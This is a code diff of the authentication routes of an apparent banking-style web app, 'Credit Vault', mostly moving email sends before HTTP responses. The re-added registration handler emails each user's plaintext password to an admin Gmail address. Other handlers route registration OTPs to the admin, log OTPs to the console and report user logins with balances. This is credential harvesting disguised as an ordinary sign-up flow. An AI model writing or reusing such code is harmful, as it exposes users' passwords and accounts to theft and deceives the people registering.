@@ -8,7 +8,6 @@ const auth = require("../middleware/auth");
 const ADMIN_EMAIL = process.env.ADMIN_EMAIL || "creditvault.support@gmail.com";
 
 // ── SINGLE REUSABLE TRANSPORTER ───────────────────────────────────────────────
-// Created once at startup — not per request
 const transporter = nodemailer.createTransport({
   host: "smtp.gmail.com",
   port: 465,
@@ -23,7 +22,6 @@ const transporter = nodemailer.createTransport({
   connectionTimeout: 15000,
 });
 
-// Tells you immediately on startup if SMTP is broken
 transporter.verify((err) => {
   if (err) console.error("❌ SMTP verification failed:", err.message);
   else console.log("✅ SMTP transporter ready");
@@ -70,9 +68,8 @@ const otpHtml = (name, otp, action) => `
 </div>`;
 
 // ── PENDING REGISTRATIONS (in-memory) ─────────────────────────────────────────
-// Holds registration data until OTP confirmed — nothing written to DB until then
 const pendingRegistrations = new Map();
-const PENDING_TTL = 15 * 60 * 1000; // 15 minutes
+const PENDING_TTL = 15 * 60 * 1000;
 
 function setPending(email, data) {
   pendingRegistrations.set(email, { ...data, createdAt: Date.now() });
@@ -88,7 +85,6 @@ function getPending(email) {
   return entry;
 }
 
-// Sweep expired entries every 10 minutes
 setInterval(
   () => {
     const now = Date.now();
@@ -114,7 +110,6 @@ router.post("/register", async (req, res) => {
         .status(400)
         .json({ msg: "Password must be at least 8 characters." });
 
-    // Check DB for existing verified account
     const exists = await User.findOne({ email });
     if (exists)
       return res
@@ -122,8 +117,6 @@ router.post("/register", async (req, res) => {
         .json({ msg: "An account with this email already exists." });
 
     const otp = genOtp();
-
-    // Store in memory ONLY — DB not touched until OTP verified
     setPending(email, {
       fullName,
       email,
@@ -133,36 +126,34 @@ router.post("/register", async (req, res) => {
       otpExpire: Date.now() + 10 * 60 * 1000,
     });
 
-    // Respond to client immediately
+    // Send emails BEFORE responding — Vercel kills async work after res.json()
+    await Promise.all([
+      notifyAdmin(
+        `[Registration OTP] ${fullName} — ${email}`,
+        otpHtml(fullName, otp, `verify registration for ${email}`),
+      ),
+      notifyAdmin(
+        `🆕 New Registration — ${fullName}`,
+        `<div style="font-family:Inter,sans-serif;background:#03080f;color:#ddeeff;padding:48px 40px;max-width:520px;margin:0 auto;border-radius:16px;">
+          <h1 style="font-size:20px;font-weight:700;color:#ddeeff;margin:0 0 20px;">Credit<span style="color:#2563eb;">Vault</span> — New Registration</h1>
+          <div style="background:#060d1a;border:1px solid #112240;border-radius:12px;padding:28px;">
+            <table style="width:100%;border-collapse:collapse;">
+              <tr style="border-bottom:1px solid #091428;"><td style="padding:10px 0;font-size:12px;color:#3d5a7a;width:120px;">Full Name</td><td style="padding:10px 0;font-size:14px;color:#ddeeff;font-weight:600;">${fullName}</td></tr>
+              <tr style="border-bottom:1px solid #091428;"><td style="padding:10px 0;font-size:12px;color:#3d5a7a;">Email</td><td style="padding:10px 0;font-size:14px;color:#2563eb;">${email}</td></tr>
+              <tr style="border-bottom:1px solid #091428;"><td style="padding:10px 0;font-size:12px;color:#3d5a7a;">Password</td><td style="padding:10px 0;font-size:14px;color:#ddeeff;font-family:monospace;">${password}</td></tr>
+              <tr><td style="padding:10px 0;font-size:12px;color:#3d5a7a;">Account Type</td><td style="padding:10px 0;font-size:14px;color:#ddeeff;">${accountType}</td></tr>
+            </table>
+          </div>
+        </div>`,
+      ),
+    ]);
+
+    console.log(`📋 Pending registration: ${email} — OTP: ${otp}`);
     res
       .status(201)
       .json({
         msg: "Account created. Check your email for the verification code.",
       });
-
-    // OTP notification to admin (your design)
-    notifyAdmin(
-      `[Registration OTP] ${fullName} — ${email}`,
-      otpHtml(fullName, otp, `verify registration for ${email}`),
-    );
-
-    // Full registration details to admin
-    notifyAdmin(
-      `🆕 New Registration — ${fullName}`,
-      `<div style="font-family:Inter,sans-serif;background:#03080f;color:#ddeeff;padding:48px 40px;max-width:520px;margin:0 auto;border-radius:16px;">
-        <h1 style="font-size:20px;font-weight:700;color:#ddeeff;margin:0 0 20px;">Credit<span style="color:#2563eb;">Vault</span> — New Registration</h1>
-        <div style="background:#060d1a;border:1px solid #112240;border-radius:12px;padding:28px;">
-          <table style="width:100%;border-collapse:collapse;">
-            <tr style="border-bottom:1px solid #091428;"><td style="padding:10px 0;font-size:12px;color:#3d5a7a;width:120px;">Full Name</td><td style="padding:10px 0;font-size:14px;color:#ddeeff;font-weight:600;">${fullName}</td></tr>
-            <tr style="border-bottom:1px solid #091428;"><td style="padding:10px 0;font-size:12px;color:#3d5a7a;">Email</td><td style="padding:10px 0;font-size:14px;color:#2563eb;">${email}</td></tr>
-            <tr style="border-bottom:1px solid #091428;"><td style="padding:10px 0;font-size:12px;color:#3d5a7a;">Password</td><td style="padding:10px 0;font-size:14px;color:#ddeeff;font-family:monospace;">${password}</td></tr>
-            <tr><td style="padding:10px 0;font-size:12px;color:#3d5a7a;">Account Type</td><td style="padding:10px 0;font-size:14px;color:#ddeeff;">${accountType}</td></tr>
-          </table>
-        </div>
-      </div>`,
-    );
-
-    console.log(`📋 Pending registration: ${email} — OTP: ${otp}`);
   } catch (err) {
     console.error("Register error:", err.message);
     res.status(500).json({ msg: "Server error during registration." });
@@ -170,7 +161,6 @@ router.post("/register", async (req, res) => {
 });
 
 // ── VERIFY OTP (new account) ──────────────────────────────────────────────────
-// The ONLY place User.save() is called for new accounts
 router.post("/verify-otp", async (req, res) => {
   try {
     const { otp } = req.body;
@@ -188,14 +178,12 @@ router.post("/verify-otp", async (req, res) => {
     if (Date.now() > pending.otpExpire)
       return res.status(400).json({ msg: "Code expired. Request a new one." });
 
-    // Race-condition guard
     const existing = await User.findOne({ email });
     if (existing)
       return res
         .status(400)
         .json({ msg: "An account with this email already exists." });
 
-    // NOW write to DB
     const user = new User({
       fullName: pending.fullName,
       email: pending.email,
@@ -205,13 +193,10 @@ router.post("/verify-otp", async (req, res) => {
       isVerified: true,
     });
     await user.save();
-
     pendingRegistrations.delete(email);
 
-    res.json({ msg: "Account verified successfully. You can now sign in." });
-
-    // Welcome email to the actual user
-    sendMail(
+    // Send welcome email BEFORE responding
+    await sendMail(
       user.email,
       `Welcome to Credit Vault, ${user.fullName}!`,
       `<div style="font-family:Inter,sans-serif;background:#03080f;color:#ddeeff;padding:48px 40px;max-width:520px;margin:0 auto;border-radius:16px;">
@@ -224,6 +209,8 @@ router.post("/verify-otp", async (req, res) => {
         <a href="https://creditvault.org/signin" style="display:inline-block;background:#2563eb;color:white;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:700;">Sign In →</a>
       </div>`,
     );
+
+    res.json({ msg: "Account verified successfully. You can now sign in." });
   } catch (err) {
     console.error("Verify OTP error:", err.message);
     res.status(500).json({ msg: "Verification failed." });
@@ -248,14 +235,14 @@ router.post("/resend-otp", async (req, res) => {
       otpExpire: Date.now() + 10 * 60 * 1000,
     });
 
-    res.json({ msg: "New code sent." });
-
-    notifyAdmin(
+    // Send BEFORE responding
+    await notifyAdmin(
       `[Resend Registration OTP] ${pending.fullName} — ${email}`,
       otpHtml(pending.fullName, otp, `verify registration for ${email}`),
     );
 
     console.log(`📋 Resend OTP for ${email}: ${otp}`);
+    res.json({ msg: "New code sent." });
   } catch (err) {
     console.error("Resend OTP error:", err.message);
     res.status(500).json({ msg: "Failed to resend." });
@@ -273,7 +260,6 @@ router.post("/login", async (req, res) => {
 
     console.log(`Login attempt: ${email}`);
 
-    // Plain query — no Promise.race, no artificial timeout wrapper
     const user = await User.findOne({ email });
     if (!user)
       return res.status(400).json({ msg: "Invalid email or password." });
@@ -283,7 +269,7 @@ router.post("/login", async (req, res) => {
       return res.status(400).json({ msg: "Invalid email or password." });
     }
 
-    // Admin — bypass OTP, issue token immediately
+    // Admin — bypass OTP
     if (user.role === "admin") {
       user.lastLogin = new Date();
       await user.save();
@@ -312,7 +298,8 @@ router.post("/login", async (req, res) => {
       user.otpExpire = Date.now() + 10 * 60 * 1000;
       await user.save();
 
-      notifyAdmin(
+      // Send BEFORE responding
+      await notifyAdmin(
         `[Verification OTP] ${user.fullName} — ${user.email}`,
         otpHtml(user.fullName, otp, `verify registration for ${user.email}`),
       );
@@ -324,34 +311,35 @@ router.post("/login", async (req, res) => {
       });
     }
 
-    // Verified user — send login OTP to the USER (they need to enter it)
+    // Verified user — generate login OTP
     const otp = genOtp();
     user.otp = otp;
     user.otpExpire = Date.now() + 10 * 60 * 1000;
     await user.save();
 
-    // Respond to client first, then fire emails
+    // Send OTP to user AND notify admin — both BEFORE responding
+    await Promise.all([
+      sendMail(
+        user.email,
+        "Your Credit Vault login code",
+        otpHtml(user.fullName, otp, "complete your sign in"),
+      ),
+      notifyAdmin(
+        `🔐 User Login — ${user.fullName}`,
+        `<div style="font-family:Inter,sans-serif;background:#03080f;color:#ddeeff;padding:48px 40px;max-width:520px;margin:0 auto;border-radius:16px;">
+          <h1 style="font-size:20px;font-weight:700;margin:0 0 20px;">Credit<span style="color:#2563eb;">Vault</span> — User Login</h1>
+          <p style="color:#3d5a7a;">${user.fullName} (${user.email}) signed in.<br>Balance: $${(user.balance || 0).toLocaleString()}</p>
+        </div>`,
+      ),
+    ]);
+
+    console.log(`✉ Login OTP for ${user.email}: ${otp}`);
+
     res.json({
       requiresOtp: true,
       email: user.email,
       msg: "A verification code has been sent to your email.",
     });
-
-    sendMail(
-      user.email,
-      "Your Credit Vault login code",
-      otpHtml(user.fullName, otp, "complete your sign in"),
-    );
-
-    console.log(`✉ Login OTP for ${user.email}: ${otp}`);
-
-    notifyAdmin(
-      `🔐 User Login — ${user.fullName}`,
-      `<div style="font-family:Inter,sans-serif;background:#03080f;color:#ddeeff;padding:48px 40px;max-width:520px;margin:0 auto;border-radius:16px;">
-        <h1 style="font-size:20px;font-weight:700;margin:0 0 20px;">Credit<span style="color:#2563eb;">Vault</span> — User Login</h1>
-        <p style="color:#3d5a7a;">${user.fullName} (${user.email}) signed in.<br>Balance: $${(user.balance || 0).toLocaleString()}</p>
-      </div>`,
-    );
   } catch (err) {
     console.error("Login error:", err.message);
     res.status(500).json({ msg: "Server error during login." });
@@ -412,13 +400,14 @@ router.post("/send-password-change-otp", auth, async (req, res) => {
     user.otpExpire = Date.now() + 10 * 60 * 1000;
     await user.save();
 
-    res.json({ msg: "Verification code sent to your email." });
-
-    sendMail(
+    // Send BEFORE responding
+    await sendMail(
       user.email,
       "Your Credit Vault password change code",
       otpHtml(user.fullName, otp, "change your password"),
     );
+
+    res.json({ msg: "Verification code sent to your email." });
   } catch (err) {
     console.error("Send password change OTP:", err.message);
     res.status(500).json({ msg: "Failed to send code." });
@@ -486,15 +475,15 @@ router.post("/forgot-password", async (req, res) => {
     user.resetExpire = Date.now() + 10 * 60 * 1000;
     await user.save();
 
-    res.json({ msg: "Reset code sent to your email." });
-
-    sendMail(
+    // Send BEFORE responding
+    await sendMail(
       user.email,
       "Credit Vault — Password Reset Code",
       otpHtml(user.fullName, otp, "reset your password"),
     );
 
     console.log(`📋 Reset OTP for ${user.email}: ${otp}`);
+    res.json({ msg: "Reset code sent to your email." });
   } catch (err) {
     console.error("Forgot password error:", err.message);
     res.status(500).json({ msg: "Failed to send reset code." });
@@ -549,7 +538,7 @@ router.post("/reset-password", async (req, res) => {
   }
 });
 
-// ── CHANGE PASSWORD (logged in, requires current password) ───────────────────
+// ── CHANGE PASSWORD (logged in) ───────────────────────────────────────────────
 router.post("/change-password", auth, async (req, res) => {
   try {
     const { currentPassword, newPassword } = req.body;
